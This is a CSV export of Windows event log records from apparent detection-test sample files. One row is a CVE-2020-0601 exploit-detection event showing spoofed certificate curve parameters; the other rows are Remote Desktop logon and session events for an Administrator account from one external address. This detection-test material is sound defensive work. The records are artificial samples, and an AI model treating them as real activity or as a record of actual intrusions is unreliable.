1,19156,2020-01-18 18:14:29.8318684,1,Warning,Microsoft-Windows-Audit-CVE,Application,23004,22388,Isaac,0,S-1-5-21-955638165-4017457581-270078328-1001,An attempt to exploit a known vulnerability detected,,,[CVE-2020-0601] cert validation,CA: &lt;USERTrust ECC Certification Authority&gt; sha1: C01B8463C8619676BA102EEBF0C30CDCED9A942B para: 06052B81040022 otherPara: 30820157020101303C06072A8648CE3D0101023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF307B0430FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC0430B3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF031500A335926AA319A27A1D00896A6773A4827ACDAC73046104D6EB7932E25502AE5151A3609384C13041904BE25B912B77FE4333C0B1486FB0CD815522FF79F8E85A9045E8DFDA490E706BD2FC38276D0A998962A1DFA1E0361AE82AEFC24BDECD9BD856CDC2FDADB54DEEFF6ACDFC0B2BF5ABEBB21C5705D4023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973020101,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Vulnerabilities/App_1_CVE-Detected.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""CVEID"",""#text"":""[CVE-2020-0601] cert validation""},{""@Name"":""AdditionalDetails"",""#text"":""CA: &lt;USERTrust ECC Certification Authority&gt; sha1: C01B8463C8619676BA102EEBF0C30CDCED9A942B para: 06052B81040022 otherPara: 30820157020101303C06072A8648CE3D0101023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFF307B0430FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFF0000000000000000FFFFFFFC0430B3312FA7E23EE7E4988E056BE3F82D19181D9C6EFE8141120314088F5013875AC656398D8A2ED19D2A85C8EDD3EC2AEF031500A335926AA319A27A1D00896A6773A4827ACDAC73046104D6EB7932E25502AE5151A3609384C13041904BE25B912B77FE4333C0B1486FB0CD815522FF79F8E85A9045E8DFDA490E706BD2FC38276D0A998962A1DFA1E0361AE82AEFC24BDECD9BD856CDC2FDADB54DEEFF6ACDFC0B2BF5ABEBB21C5705D4023100FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973020101""}]}}"
74,74,2024-11-04 13:55:34.6579658,303,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User disconnected from resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 disconnected from ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,"Before EC2AMAZ-6C3C9U6\Administrator disconnected, the client transferred 678033 bytes and received 810679 bytes",The client session duration was 122 seconds,ErrorCode: 1226,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""BytesReceived"":""810679"",""BytesTransfered"":""678033"",""SessionDuration"":""122"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""1226""}}}"
75,75,2024-11-04 13:58:08.6464861,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63913 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63913""}}}"
76,76,2024-11-04 13:58:09.2054417,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63913 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63913""}}}"
77,77,2024-11-04 13:58:14.2410561,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63914 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63914""}}}"
78,78,2024-11-04 13:58:14.4809723,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63914 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63914""}}}"
79,79,2024-11-04 13:58:27.8827187,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63915 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63915""}}}"
80,80,2024-11-04 13:58:27.9212444,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2452,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63915 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63915""}}}"
81,81,2024-11-04 13:58:27.9786474,200,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2984,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to TS Gateway server,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to access the TS Gateway server,,,ErrorCode: 0,ConnectionProtocol: HTTP,AuthType: NTLM,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":""NTLM"",""Resource"":"""",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
82,82,2024-11-04 13:58:28.0284523,300,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2564,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to connect to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,"ConnectionProtocol: ","AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":"""",""ErrorCode"":""0""}}}"
83,83,2024-11-04 13:58:28.0319644,302,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2564,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User connected to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 connected to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
84,84,2024-11-04 13:59:25.4316243,303,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User disconnected from resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 disconnected from ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,"Before EC2AMAZ-6C3C9U6\Administrator disconnected, the client transferred 241242 bytes and received 391624 bytes",The client session duration was 57 seconds,ErrorCode: 1226,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""BytesReceived"":""391624"",""BytesTransfered"":""241242"",""SessionDuration"":""57"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""1226""}}}"
85,85,2024-11-04 13:59:31.1919595,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63920 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63920""}}}"
86,86,2024-11-04 13:59:31.3792093,312,LogAlways,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User has initiated an outbound connection,Administrator,,Administrator on client computer 219.100.37.243:63920 has initiated an outbound connection that has yet to be authenticated,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000000000000,0,"{""UserData"":{""EventInfo"":{""Username"":""Administrator"",""IpAddress"":""219.100.37.243:63920""}}}"
87,87,2024-11-04 13:59:32.4005868,200,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2256,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to TS Gateway server,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to access the TS Gateway server,,,ErrorCode: 0,ConnectionProtocol: HTTP,AuthType: NTLM,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":""NTLM"",""Resource"":"""",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
88,88,2024-11-04 13:59:32.6212995,300,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2556,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User meets resource authorization policy requirements needed to connect to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 met resource authorization policy requirements and was therefore authorized to connect to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,"ConnectionProtocol: ","AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4020000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":"""",""ErrorCode"":""0""}}}"
89,89,2024-11-04 13:59:32.6243736,302,Info,Microsoft-Windows-TerminalServices-Gateway,Microsoft-Windows-TerminalServices-Gateway/Operational,1444,2556,EC2AMAZ-6C3C9U6,0,S-1-5-20,Remote Desktop Services: User connected to resource,EC2AMAZ-6C3C9U6\Administrator,,EC2AMAZ-6C3C9U6\Administrator on client computer 219.100.37.243 connected to ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com,,,ErrorCode: 0,ConnectionProtocol: HTTP,"AuthType: ",,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID302 RDS Gateway Logon Logoff.evtx,0x4000000001000000,0,"{""UserData"":{""EventInfo"":{""Username"":""EC2AMAZ-6C3C9U6\\Administrator"",""IpAddress"":""219.100.37.243"",""AuthType"":"""",""Resource"":""ec2-18-179-8-103.ap-northeast-1.compute.amazonaws.com"",""ConnectionProtocol"":""HTTP"",""ErrorCode"":""0""}}}"
2262,2262,2024-11-14 03:22:50.7567375,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2263,2263,2024-11-14 03:22:50.7570148,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2264,2264,2024-11-14 03:22:50.7572505,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2265,2265,2024-11-14 03:23:10.6174382,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,4932,EC2AMAZ-JET8PQL,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2266,2266,2024-11-14 03:23:10.8516729,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,916,952,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2267,2267,2024-11-22 21:53:00.4081622,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,964,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2268,2268,2024-11-22 21:53:00.4108461,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2269,2269,2024-11-22 21:53:00.4123603,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2270,2270,2024-11-22 21:53:00.4126543,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2271,2271,2024-11-22 21:53:00.4134804,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2272,2272,2024-11-22 21:53:00.4139932,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2273,2273,2024-11-22 21:53:04.6977916,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2274,2274,2024-11-22 21:53:04.6979987,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2275,2275,2024-11-22 21:53:04.7983551,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2276,2276,2024-11-22 21:53:04.7997466,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2277,2277,2024-11-22 21:53:05.7343396,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2278,2278,2024-11-22 21:53:43.5297395,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2279,2279,2024-11-22 21:53:47.5079710,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2280,2280,2024-11-22 21:53:49.7688182,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2281,2281,2024-11-22 21:53:49.8051987,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,976,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2282,2282,2024-11-22 21:53:49.8122846,54,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,948,376,WIN-OQ7I3J4IGKK,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2283,2283,2024-11-22 21:54:15.1861994,32,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,924,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""UserData"":{""EventXML"":{""messageName"":""RDSAppXPlugin""}}}"
2284,2284,2024-11-22 21:54:15.1889551,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2285,2285,2024-11-22 21:54:15.1902007,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2286,2286,2024-11-22 21:54:15.1904528,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2287,2287,2024-11-22 21:54:15.1910100,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2288,2288,2024-11-22 21:54:15.1913195,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2289,2289,2024-11-22 21:54:19.2956674,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2290,2290,2024-11-22 21:54:19.2958874,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2291,2291,2024-11-22 21:54:19.3626110,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2292,2292,2024-11-22 21:54:21.6979774,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
2293,2293,2024-11-22 21:54:40.1994369,34,Info,Microsoft-Windows-TerminalServices-LocalSessionManager,Microsoft-Windows-TerminalServices-LocalSessionManager/Operational,908,932,EC2AMAZ-3NFFVNI,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/IntialAccess/ValidAccounts/ID21-25 RDP Logon Logoff Reconnect.evtx,0x1000000000000000,0,"{""EventData"":""""}"
